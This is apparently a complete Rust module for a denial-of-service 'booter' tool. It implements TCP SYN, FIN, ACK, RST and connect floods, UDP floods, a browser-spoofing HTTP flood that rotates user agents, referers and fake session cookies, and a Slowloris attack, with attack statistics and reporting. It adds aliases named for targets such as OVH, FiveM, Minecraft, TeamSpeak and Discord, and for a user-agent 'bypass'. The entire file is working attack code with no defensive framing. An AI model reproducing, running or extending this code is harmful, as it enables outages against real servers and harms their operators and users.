use tokio::net::{UdpSocket, TcpStream};
use tokio::time::{Duration, Instant, sleep};
use tokio::io::AsyncWriteExt;
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;
use std::sync::atomic::{AtomicU64, AtomicUsize, AtomicBool, Ordering};
use std::sync::Arc;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, REFERER, ACCEPT_LANGUAGE, CONNECTION, CACHE_CONTROL, COOKIE, CONTENT_TYPE};

// --- Comprehensive Statistics ---

struct AttackStats {
    packets_sent: AtomicU64,
    bytes_sent: AtomicU64,
    errors: AtomicU64,
    active_workers: AtomicUsize,
    
    // Protocol Specific
    http_2xx: AtomicU64,
    http_3xx: AtomicU64,
    http_4xx: AtomicU64,
    http_5xx: AtomicU64,
    
    // Timing Metrics (Microseconds for precision)
    total_latency_micros: AtomicU64,
    latency_samples: AtomicU64,
}

impl AttackStats {
    fn new() -> Self {
        Self {
            packets_sent: AtomicU64::new(0),
            bytes_sent: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            active_workers: AtomicUsize::new(0),
            http_2xx: AtomicU64::new(0),
            http_3xx: AtomicU64::new(0),
            http_4xx: AtomicU64::new(0),
            http_5xx: AtomicU64::new(0),
            total_latency_micros: AtomicU64::new(0),
            latency_samples: AtomicU64::new(0),
        }
    }

    fn record_packet(&self, size: usize) {
        self.packets_sent.fetch_add(1, Ordering::Relaxed);
        self.bytes_sent.fetch_add(size as u64, Ordering::Relaxed);
    }

    fn record_error(&self) {
        self.errors.fetch_add(1, Ordering::Relaxed);
    }

    fn record_http_status(&self, status: u16) {
        match status {
            200..=299 => { self.http_2xx.fetch_add(1, Ordering::Relaxed); }
            300..=399 => { self.http_3xx.fetch_add(1, Ordering::Relaxed); }
            400..=499 => { self.http_4xx.fetch_add(1, Ordering::Relaxed); }
            500..=599 => { self.http_5xx.fetch_add(1, Ordering::Relaxed); }
            _ => {}
        };
    }

    fn record_latency(&self, duration: Duration) {
        self.total_latency_micros.fetch_add(duration.as_micros() as u64, Ordering::Relaxed);
        self.latency_samples.fetch_add(1, Ordering::Relaxed);
    }
}

// --- Configuration & Helpers ---

fn get_worker_count() -> usize {
    let cpu_count = num_cpus::get();
    (cpu_count * 4).clamp(8, 128)
}

async fn resolve_target(target: &str, port: u16) -> Option<std::net::SocketAddr> {
    match tokio::net::lookup_host(format!("{}:{}", target, port)).await {
        Ok(mut addrs) => addrs.next(),
        Err(_) => None,
    }
}

async fn create_udp_socket(target_addr: &std::net::SocketAddr) -> Option<UdpSocket> {
    let socket = match UdpSocket::bind("0.0.0.0:0").await {
        Ok(s) => s,
        Err(_) => return None,
    };
    if socket.connect(target_addr).await.is_err() {
        return None;
    }
    Some(socket)
}

// --- TCP Flag Emulation (Native) ---

pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting TCP Flood (Standard Socket) on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    
    let target_addr = match resolve_target(target, port).await {
        Some(addr) => addr,
        None => {
            println!("Failed to resolve target {}", target);
            return;
        }
    };

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let stop_signal = stop_signal.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let mut rng = StdRng::from_entropy();
            let mut buf = [0u8; 1024];

            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                match tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&target_addr)).await {
                    Ok(Ok(mut stream)) => {
                        rng.fill(&mut buf);
                        if stream.write_all(&buf).await.is_ok() {
                            let _ = stream.set_linger(Some(Duration::from_secs(0)));
                            stats.record_packet(buf.len());
                        } else {
                            stats.record_error();
                        }
                    }
                    _ => {
                        stats.record_error();
                    }
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP Flood").await;
}

pub async fn tcp_connect_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting TCP Connect Flood (Standard Socket) on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    
    let target_addr = match resolve_target(target, port).await {
        Some(addr) => addr,
        None => {
            println!("Failed to resolve target {}", target);
            return;
        }
    };

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let stop_signal = stop_signal.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                match tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&target_addr)).await {
                    Ok(Ok(stream)) => {
                        let _ = stream.set_linger(Some(Duration::from_secs(0)));
                        stats.record_packet(64);
                        drop(stream);
                    }
                    _ => {
                        stats.record_error();
                    }
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP Connect").await;
}

pub async fn syn_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting TCP SYN Flood (Optimized) on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    
    let target_addr = match resolve_target(target, port).await {
        Some(addr) => addr,
        None => {
            println!("Failed to resolve target {}", target);
            return;
        }
    };

    // Optimized concurrency for maximum throughput
    // 4096 workers with very short timeouts to maximize packet rate
    let num_workers = 4096; 
    let mut handles = vec![];
    let payload = Arc::new(vec![0u8; 65536]); // 64KB payload for max bandwidth

    for _ in 0..num_workers {
        let stats = stats.clone();
        let stop_signal = stop_signal.clone();
        let target_addr = target_addr;
        let payload = payload.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                // Increased timeout to 50ms to allow handshake completion so we can send data
                match tokio::time::timeout(Duration::from_millis(50), TcpStream::connect(&target_addr)).await {
                    Ok(Ok(mut stream)) => {
                        // Connection established - Blast data!
                        // We try to write the full 64KB payload
                        if stream.write_all(&payload).await.is_ok() {
                            stats.record_packet(payload.len());
                        } else {
                            // If write fails, we still count the handshake overhead
                            stats.record_packet(64);
                        }
                        // Reset connection immediately to free resources
                        let _ = stream.set_linger(Some(Duration::from_secs(0)));
                        drop(stream);
                    },
                    Ok(Err(e)) => {
                        // Connection failed (e.g. Refused, Unreachable)
                        // This usually means the SYN reached the target or gateway.
                        // We count this as a packet sent.
                        // Only count as error if it's a local resource issue
                        if e.kind() == std::io::ErrorKind::Other || e.kind() == std::io::ErrorKind::OutOfMemory {
                             stats.record_error();
                             sleep(Duration::from_millis(100)).await; // Backoff slightly
                        } else {
                             stats.record_packet(64); // Estimate 64 bytes for SYN
                        }
                    },
                    Err(_) => {
                        // Timeout
                        // SYN was sent, but we didn't wait for ACK.
                        // This is the desired behavior for a SYN flood.
                        stats.record_packet(64); // Estimate 64 bytes for SYN
                    }
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    
    await_and_report(handles, stats, "TCP SYN").await;
}

pub async fn fin_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting TCP FIN Flood (Simulated) on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    
    let target_addr = match resolve_target(target, port).await {
        Some(addr) => addr,
        None => {
            println!("Failed to resolve target {}", target);
            return;
        }
    };

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let stop_signal = stop_signal.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    // Shutdown Write sends FIN
                    if stream.shutdown().await.is_ok() {
                        let _ = stream.set_linger(Some(Duration::from_secs(0)));
                        stats.record_packet(64);
                    } else {
                        stats.record_error();
                    }
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP FIN").await;
}

pub async fn ack_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting TCP ACK Flood (Simulated) on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    
    let target_addr = match resolve_target(target, port).await {
        Some(addr) => addr,
        None => {
            println!("Failed to resolve target {}", target);
            return;
        }
    };

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let stop_signal = stop_signal.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let payload = vec![0u8; 64]; // Small payload for ACK/PSH
            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    // Sending data sets PSH flag and expects ACK
                    if stream.write_all(&payload).await.is_ok() {
                        let _ = stream.set_linger(Some(Duration::from_secs(0)));
                        stats.record_packet(payload.len());
                    } else {
                        stats.record_error();
                    }
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP ACK").await;
}

pub async fn rst_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting TCP RST Flood (Simulated) on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    
    let target_addr = match resolve_target(target, port).await {
        Some(addr) => addr,
        None => {
            println!("Failed to resolve target {}", target);
            return;
        }
    };

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let stop_signal = stop_signal.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                if let Ok(stream) = TcpStream::connect(&target_addr).await {
                    // Setting linger to 0 forces RST when socket is closed
                    if let Ok(_) = stream.set_linger(Some(Duration::from_secs(0))) {
                        stats.record_packet(64);
                    }
                    drop(stream);
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP RST").await;
}

// --- Advanced HTTP Browser Simulation ---

struct BrowserProfile {
    user_agents: Vec<&'static str>,
    referers: Vec<&'static str>,
    languages: Vec<&'static str>,
}

impl BrowserProfile {
    fn new() -> Self {
        Self {
            user_agents: vec![
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            ],
            referers: vec![
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.facebook.com/",
                "https://twitter.com/",
                "https://www.reddit.com/",
            ],
            languages: vec![
                "en-US,en;q=0.9",
                "en-GB,en;q=0.8",
                "es-ES,es;q=0.9",
                "zh-CN,zh;q=0.9",
            ],
        }
    }

    fn get_headers(&self, rng: &mut StdRng, session_cookie: &str) -> HeaderMap {
        let mut headers = HeaderMap::new();
        
        let ua = self.user_agents[rng.gen_range(0..self.user_agents.len())];
        headers.insert(USER_AGENT, HeaderValue::from_static(ua));

        let referer = self.referers[rng.gen_range(0..self.referers.len())];
        headers.insert(REFERER, HeaderValue::from_static(referer));

        let lang = self.languages[rng.gen_range(0..self.languages.len())];
        headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static(lang));

        headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
        headers.insert(CACHE_CONTROL, HeaderValue::from_static("no-cache"));
        
        if let Ok(val) = HeaderValue::from_str(session_cookie) {
            headers.insert(COOKIE, val);
        }

        headers
    }
}

pub async fn http_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting Advanced HTTP Browser Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    let target_url = format!("http://{}:{}/", target, port);
    let profile = Arc::new(BrowserProfile::new());

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_url = target_url.clone();
        let profile = profile.clone();
        let stop_signal = stop_signal.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let client = reqwest::Client::builder()
                .pool_max_idle_per_host(100)
                .timeout(Duration::from_secs(10))
                .danger_accept_invalid_certs(true)
                .build()
                .unwrap_or_default();

            let mut rng = StdRng::from_entropy();
            let mut backoff = Duration::from_millis(10);

            // Session Management: Keep cookie for N requests
            let mut session_cookie = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
            let mut requests_in_session = 0;

            while Instant::now() < end_time && !stop_signal.load(Ordering::Relaxed) {
                // Rotate session occasionally
                if requests_in_session > 50 {
                    session_cookie = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
                    requests_in_session = 0;
                }

                let headers = profile.get_headers(&mut rng, &session_cookie);
                
                // Mixed Traffic: 80% GET, 20% POST
                let is_post = rng.gen_bool(0.2);
                
                let req_builder = if is_post {
                    let body_data = format!("{{\"data\": \"{}\", \"timestamp\": {}}}", rng.gen::<u64>(), chrono::Utc::now().timestamp());
                    client.post(&target_url)
                        .headers(headers.clone())
                        .header(CONTENT_TYPE, "application/json")
                        .body(body_data)
                } else {
                    client.get(&target_url).headers(headers.clone())
                };

                let start = Instant::now();
                match req_builder.send().await {
                    Ok(resp) => {
                        stats.record_latency(start.elapsed());
                        stats.record_packet(1);
                        stats.record_http_status(resp.status().as_u16());
                        backoff = Duration::from_millis(10); // Reset backoff
                        requests_in_session += 1;
                    },
                    Err(_) => {
                        stats.record_error();
                        sleep(backoff).await;
                        backoff = (backoff * 2).min(Duration::from_secs(2));
                    }
                }
                
                // Random Jitter for realism
                sleep(Duration::from_millis(rng.gen_range(1..5))).await;
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "HTTP Browser").await;
}

// --- UDP Methods ---

pub async fn udp_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting UDP Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    
    let target_addr = match resolve_target(target, port).await {
        Some(addr) => addr,
        None => {
            println!("Failed to resolve target {}", target);
            return;
        }
    };
    let payload = Arc::new(vec![0u8; 1400]); 

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let payload = payload.clone();
        let stop_signal = stop_signal.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let socket = match create_udp_socket(&target_addr).await {
                Some(s) => s,
                None => return,
            };

            while Instant::now() < end_time && !stop_signal.load(Ordering::Relaxed) {
                if socket.send(&payload).await.is_ok() {
                    stats.record_packet(payload.len());
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "UDP").await;
}

pub async fn udp_smart(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting Smart UDP Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    
    let target_addr = match resolve_target(target, port).await {
        Some(addr) => addr,
        None => {
            println!("Failed to resolve target {}", target);
            return;
        }
    };

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let stop_signal = stop_signal.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let socket = match create_udp_socket(&target_addr).await {
                Some(s) => s,
                None => return,
            };

            let mut rng = StdRng::from_entropy();
            let mut packet_pool = Vec::with_capacity(64);
            for _ in 0..64 {
                let size = rng.gen_range(64..1200);
                let mut p = vec![0u8; size];
                rng.fill(&mut p[..]);
                packet_pool.push(p);
            }

            let mut idx = 0;
            while Instant::now() < end_time && !stop_signal.load(Ordering::Relaxed) {
                let payload = &packet_pool[idx % packet_pool.len()];
                idx = idx.wrapping_add(1);

                if socket.send(payload).await.is_ok() {
                    stats.record_packet(payload.len());
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "Smart UDP").await;
}

// --- Application Layer ---

pub async fn slowloris(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    println!("Starting Slowloris on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count() * 2; 
    
    let target_addr = match resolve_target(target, port).await {
        Some(addr) => addr,
        None => {
            println!("Failed to resolve target {}", target);
            return;
        }
    };

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let stop_signal = stop_signal.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while Instant::now() < end_time && !stop_signal.load(Ordering::Relaxed) {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    stats.record_packet(1); // 1 Connection
                    let _ = stream.write_all(b"GET / HTTP/1.1\r\n").await;
                    let _ = stream.write_all(format!("Host: {}\r\n", target_addr).as_bytes()).await;
                    let _ = stream.write_all(b"User-Agent: Mozilla/5.0\r\n").await;
                    
                    let mut interval = tokio::time::interval(Duration::from_secs(10));
                    loop {
                        if Instant::now() >= end_time || stop_signal.load(Ordering::Relaxed) { break; }
                        interval.tick().await;
                        let header = format!("X-KeepAlive-{}: {}\r\n", rand::random::<u32>(), rand::random::<u32>());
                        if stream.write_all(header.as_bytes()).await.is_err() {
                            stats.record_error();
                            break; 
                        }
                    }
                } else {
                    stats.record_error();
                    sleep(Duration::from_secs(1)).await;
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "Slowloris").await;
}

// --- Reporting ---

async fn await_and_report(handles: Vec<tokio::task::JoinHandle<()>>, stats: Arc<AttackStats>, name: &str) {
    let stats_clone = stats.clone();
    let reporter = tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(5));
        loop {
            interval.tick().await;
            let packets = stats_clone.packets_sent.load(Ordering::Relaxed);
            let workers = stats_clone.active_workers.load(Ordering::Relaxed);
            if workers == 0 && packets > 0 { break; } 
        }
    });

    for handle in handles {
        let _ = handle.await;
    }
    let _ = reporter.await;
    
    let total_pkts = stats.packets_sent.load(Ordering::Relaxed);
    let total_samples = stats.latency_samples.load(Ordering::Relaxed);
    let avg_latency = if total_samples > 0 {
        stats.total_latency_micros.load(Ordering::Relaxed) as f64 / total_samples as f64 / 1000.0
    } else {
        0.0
    };

    println!("{} Attack Complete.", name);
    println!("  Total Packets/Reqs: {}", total_pkts);
    println!("  Total Data Sent:    {:.2} MB", stats.bytes_sent.load(Ordering::Relaxed) as f64 / 1024.0 / 1024.0);
    println!("  Total Errors:       {}", stats.errors.load(Ordering::Relaxed));
    println!("  Avg Latency:        {:.2} ms", avg_latency);
    
    if stats.http_2xx.load(Ordering::Relaxed) > 0 || stats.http_5xx.load(Ordering::Relaxed) > 0 {
        println!("  HTTP Stats:");
        println!("    2xx: {}", stats.http_2xx.load(Ordering::Relaxed));
        println!("    3xx: {}", stats.http_3xx.load(Ordering::Relaxed));
        println!("    4xx: {}", stats.http_4xx.load(Ordering::Relaxed));
        println!("    5xx: {}", stats.http_5xx.load(Ordering::Relaxed));
    }
}

// --- Aliases & Fallbacks ---

pub async fn udp_max_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_flood(target, port, duration_secs, stop_signal).await; }
pub async fn gre_flood(target: &str, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    // NOTE: Real GRE flood requires raw sockets (root). This is a UDP simulation.
    println!("Starting UDP Flood (Simulating GRE) on {}:47 for {}s", target, duration_secs);
    udp_flood(target, 47, duration_secs, stop_signal).await;
}
pub async fn icmp_flood(target: &str, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
    // NOTE: Real ICMP flood requires raw sockets (root). This is a UDP simulation.
    println!("Starting UDP Flood (Simulating ICMP) on {}:80 for {}s", target, duration_secs);
    udp_flood(target, 80, duration_secs, stop_signal).await;
}
pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { tcp_connect_flood(target, port, duration_secs, stop_signal).await; }
pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { ack_flood(target, port, duration_secs, stop_signal).await; } 
pub async fn dns_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
pub async fn dns_flood_l4(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
pub async fn ua_bypass_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { http_flood(target, port, duration_secs, stop_signal).await; }
pub async fn http_stress(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { http_flood(target, port, duration_secs, stop_signal).await; }
pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { http_flood(target, port, duration_secs, stop_signal).await; }
pub async fn sip_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
pub async fn minecraft_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { ack_flood(target, port, duration_secs, stop_signal).await; }
pub async fn raknet_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
pub async fn fivem_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
pub async fn ts3_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
pub async fn discord_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
pub async fn vse_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
